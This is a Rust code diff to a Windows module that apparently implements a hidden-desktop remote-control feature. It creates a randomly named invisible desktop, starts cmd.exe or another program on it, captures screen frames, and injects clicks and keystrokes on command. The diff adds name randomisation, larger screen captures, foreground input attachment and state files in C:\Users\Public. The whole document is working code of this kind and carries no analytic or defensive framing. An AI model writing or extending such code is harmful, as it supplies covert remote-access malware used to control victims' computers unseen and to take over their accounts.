@@ -17,6 +17,9 @@ extern "system" {
     fn mouse_event(flags: u32, x: i32, y: i32, data: u32, extra: usize);
     fn keybd_event(vk: u8, scan: u8, flags: u32, extra: usize);
     fn VkKeyScanW(ch: u16) -> i16;
+    fn AttachThreadInput(attach: u32, target: u32, attach_flag: i32) -> i32;
+    fn GetForegroundWindow() -> *mut c_void;
+    fn GetWindowThreadProcessId(hwnd: *mut c_void, pid: *mut u32) -> u32;
 }
 #[link(name = "gdi32")]
 extern "system" {
@@ -55,14 +58,34 @@ struct BitmapInfo {
 
 static mut DESK: Hdesk = ptr::null_mut();
 static mut DESK_NAME: String = String::new();
+static mut ORIG_DESK: Hdesk = ptr::null_mut();
+
+#[link(name = "user32")]
+extern "system" {
+    fn GetThreadDesktop(tid: u32) -> Hdesk;
+}
+#[link(name = "kernel32")]
+extern "system" {
+    fn GetCurrentThreadId() -> u32;
+}
 
 fn wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }
+
+fn rand_name() -> String {
+    let mut s = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_nanos() as u64).unwrap_or(1);
+    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz".chars().collect();
+    let mut name = String::with_capacity(10);
+    for _ in 0..10 {
+        s ^= s << 13; s ^= s >> 7; s ^= s << 17;
+        name.push(chars[(s as usize) % chars.len()]);
+    }
+    name
+}
 
 fn ensure() -> bool {
     unsafe {
         if !DESK.is_null() { return true; }
-        let ticks = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(1);
-        DESK_NAME = format!("d{ticks:x}");
+        DESK_NAME = rand_name();
         let name = wide(&DESK_NAME);
         DESK = CreateDesktopW(name.as_ptr(), ptr::null(), ptr::null_mut(), 0, 0x10000000, ptr::null_mut());
         if DESK.is_null() { DESK = OpenDesktopW(name.as_ptr(), 0, 0, 0x02000000); }
@@ -73,9 +96,17 @@ fn ensure() -> bool {
 fn on_desk<F: FnOnce() -> String>(f: F) -> String {
     if !ensure() { return "desktop open failed".into(); }
     unsafe {
+        ORIG_DESK = GetThreadDesktop(GetCurrentThreadId());
         if SetThreadDesktop(DESK) == 0 { return "set desktop failed".into(); }
     }
-    f()
+    let result = f();
+    unsafe {
+        if !ORIG_DESK.is_null() {
+            SetThreadDesktop(ORIG_DESK);
+            ORIG_DESK = ptr::null_mut();
+        }
+    }
+    result
 }
 
 fn via_host(rest: &str) -> String {
@@ -104,14 +135,33 @@ pub fn handle(rest: &str) -> String {
     if !via.is_empty() { return via; }
     let (action, arg) = rest.split_once(' ').unwrap_or((rest, ""));
     match action {
-        "" | "start" => on_desk(|| start(if arg.is_empty() { r"C:\Windows\System32\cmd.exe" } else { arg })),
+        "" | "start" => {
+            let result = on_desk(|| start(if arg.is_empty() { r"C:\Windows\System32\cmd.exe" } else { arg }));
+            unsafe {
+                if !DESK.is_null() {
+                    let _ = std::fs::write(r"C:\Users\Public\hddesk.txt", &DESK_NAME);
+                }
+            }
+            result
+        },
         "frame" => on_desk(frame),
         "click" => on_desk(|| click(arg, false)),
         "rclick" => on_desk(|| click(arg, true)),
         "type" => on_desk(|| type_text(arg)),
         "key" => on_desk(|| key(arg.parse().unwrap_or(13))),
         "stop" => unsafe {
-            if !DESK.is_null() { CloseDesktop(DESK); DESK = ptr::null_mut(); }
+            if !DESK.is_null() {
+                if !ORIG_DESK.is_null() {
+                    SetThreadDesktop(ORIG_DESK);
+                    ORIG_DESK = ptr::null_mut();
+                }
+                CloseDesktop(DESK);
+                DESK = ptr::null_mut();
+            }
+            let _ = std::fs::remove_file(r"C:\Users\Public\hddesk.txt");
+            let _ = std::fs::remove_file(r"C:\Users\Public\hdin.txt");
+            let _ = std::fs::remove_file(r"C:\Users\Public\hdout.txt");
+            let _ = std::fs::remove_file(r"C:\Users\Public\hdclick.txt");
             "desktop stopped".into()
         },
         _ => "unknown desktop action".into(),
@@ -135,7 +185,7 @@ fn frame() -> String {
         let mut sw = GetSystemMetrics(0);
         let mut sh = GetSystemMetrics(1);
         if sw <= 0 || sh <= 0 { sw = 1024; sh = 768; }
-        let dw = if sw > 320 { 320 } else { sw };
+        let dw = if sw > 800 { 800 } else { sw };
         let dh = (sh * dw / sw).max(1);
         let mem = CreateCompatibleDC(hdc);
         let bmp = CreateCompatibleBitmap(hdc, dw, dh);
@@ -162,6 +212,27 @@ fn frame() -> String {
     }
 }
 
+fn attach_fg() -> (u32, bool) {
+    unsafe {
+        let my_tid = GetCurrentThreadId();
+        let fg = GetForegroundWindow();
+        if fg.is_null() { return (0, false); }
+        let fg_tid = GetWindowThreadProcessId(fg, std::ptr::null_mut());
+        if fg_tid != 0 && fg_tid != my_tid {
+            let ok = AttachThreadInput(my_tid, fg_tid, 1) != 0;
+            return (fg_tid, ok);
+        }
+        (0, false)
+    }
+}
+
+fn detach_fg(fg_tid: u32) {
+    unsafe {
+        let my_tid = GetCurrentThreadId();
+        AttachThreadInput(my_tid, fg_tid, 0);
+    }
+}
+
 fn click(arg: &str, right: bool) -> String {
     let mut parts = arg.split_whitespace();
     let x: i32 = parts.next().and_then(|s| s.parse().ok()).unwrap_or(0);
@@ -170,20 +241,23 @@ fn click(arg: &str, right: bool) -> String {
     unsafe {
         let sw = GetSystemMetrics(0).max(1);
         let sh = GetSystemMetrics(1).max(1);
+        let (fg_tid, attached) = attach_fg();
         mouse_event(0x8001, x * 65535 / sw, y * 65535 / sh, 0, 0);
         if right {
             mouse_event(0x0008, 0, 0, 0, 0);
             mouse_event(0x0010, 0, 0, 0, 0);
-            return format!("rclick {x} {y}");
+        } else {
+            mouse_event(0x0002, 0, 0, 0, 0);
+            mouse_event(0x0004, 0, 0, 0, 0);
         }
-        mouse_event(0x0002, 0, 0, 0, 0);
-        mouse_event(0x0004, 0, 0, 0, 0);
+        if attached { detach_fg(fg_tid); }
     }
-    format!("click {x} {y}")
+    format!("{} {x} {y}", if right { "rclick" } else { "click" })
 }
 
 fn type_text(text: &str) -> String {
     if text.is_empty() { return "type needs text".into(); }
+    let (fg_tid, attached) = attach_fg();
     for ch in text.encode_utf16() {
         unsafe {
             if ch == 10 || ch == 13 {
@@ -200,13 +274,16 @@ fn type_text(text: &str) -> String {
             if pair & 0x100 != 0 { keybd_event(0x10, 0, 2, 0); }
         }
     }
+    if attached { detach_fg(fg_tid); }
     format!("typed {}", text.chars().count())
 }
 
 fn key(vk: i32) -> String {
+    let (fg_tid, attached) = attach_fg();
     unsafe {
         keybd_event(vk as u8, 0, 0, 0);
         keybd_event(vk as u8, 0, 2, 0);
     }
+    if attached { detach_fg(fg_tid); }
     format!("key {vk}")
 }
